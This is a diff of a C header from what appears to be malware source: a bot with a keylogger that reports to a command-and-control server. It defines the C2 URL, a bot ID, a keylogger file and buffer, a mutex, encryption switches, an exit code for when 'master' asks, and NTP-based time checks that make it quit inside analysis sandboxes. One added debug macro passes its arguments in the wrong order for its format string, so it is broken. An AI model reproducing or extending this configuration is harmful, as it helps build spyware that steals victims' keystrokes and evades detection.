@@ -1,5 +1,28 @@
 #pragma once
 
+#ifdef DEBUGME
+#define DEBUGMSG(msg) do { \
+  fprintf(debug_log_stream, "%s\n", msg); \
+  fflush(debug_log_stream);\
+} while(0);
+#define DEBUGMSGF(format, msg) do { \
+  fprintf(debug_log_stream, format, msg); \
+  fflush(debug_log_stream);\
+} while(0);
+#define DEBUGMSGEXT(msg) do { \
+  fprintf(debug_log_stream, "Funct: %s - Line: %d - Error Msg: %s\n", __LINE__, __FUNCTION__ ,msg); \
+  fflush(debug_log_stream);\
+} while(0);
+#else
+#define DEBUGMSG(msg)
+#define DEBUGMSGF(format, msg)
+#define DEBUGMSGEXT(msg)
+#endif
+
+/******************************************************************************
+* Preprocessor Directives and Macros
+*****************************************************************************/
+
 // config
 #define SERVER_URL "http://4R35.candc.efflam.net:8443"
 #define BOT_ID ""
@@ -9,37 +32,36 @@
 #define KEYLOGGER_FILE ""
 #define MUTEXID "Mutex-4R35"
 
+// Host to get the NTP time
 #define POOL_NTP_HOST "pool.ntp.org"
+// Number of seconds of difference between NTP and Local time before exit
 #define UTC_TIME_DIFF 120
 
-#define EXIT_CODE_TIME_WARP_NULL 0x0001
-#define EXIT_CODE_TIME_WARP_2015 0x0002
-#define EXIT_CODE_TIME_WARP_NTPD 0x0004
+// Exit code, internal use only ;-)
+#define EXIT_CODE_ASKED_BY_MASTER (0x0000)
+#define EXIT_CODE_TIME_WARP_NULL  (0x0001)
+#define EXIT_CODE_TIME_WARP_2015  (0x0001 << 1)
+#define EXIT_CODE_TIME_WARP_NTPD  (0x0001 << 2)
+#define EXIT_CODE_ERROR_NTPD      (0x0001 << 3)
 
+// Crypt function to activate
 #define NO_CRYPT
 #define SIMPLE_CRYPT
 #define TEA_CRYPT
-#define HOOK_KEYLOGGER
 
-#ifndef HOOK_KEYLOGGER
-
-#define KEYLOGGER_BUF_SIZE 512
-#define KEYLOGGER_SLEEP_TIME 8
-#define KEYLOGGER_WINDOWTXT_SIZE 60
-
-#else
-
-#define KEYLOGGER_BUF_SIZE 16
-
-#endif
+// Keylogger
+// Number of key before inserting a carriage return in log file
+#define KEYLOGGER_BUF_SIZE 32
 
 #define BUFFSIZE   512
 #define MAXTHREADS 256
 
 #define ReverseEndianInt(x) ((x) = \
-    ((x)&0xff000000) >> 24 |\
-    ((x)&0x00ff0000) >> 8 |\
-    ((x)&0x0000ff00) << 8 |\
-    ((x)&0x000000ff) << 24)
+	((x)&0xff000000) >> 24 |\
+	((x)&0x00ff0000) >>  8 |\
+	((x)&0x0000ff00) <<  8 |\
+	((x)&0x000000ff) << 24)
 
 #define JAN_1970 2208988800UL	/* Unix base epoch */
+
+/* Structures */
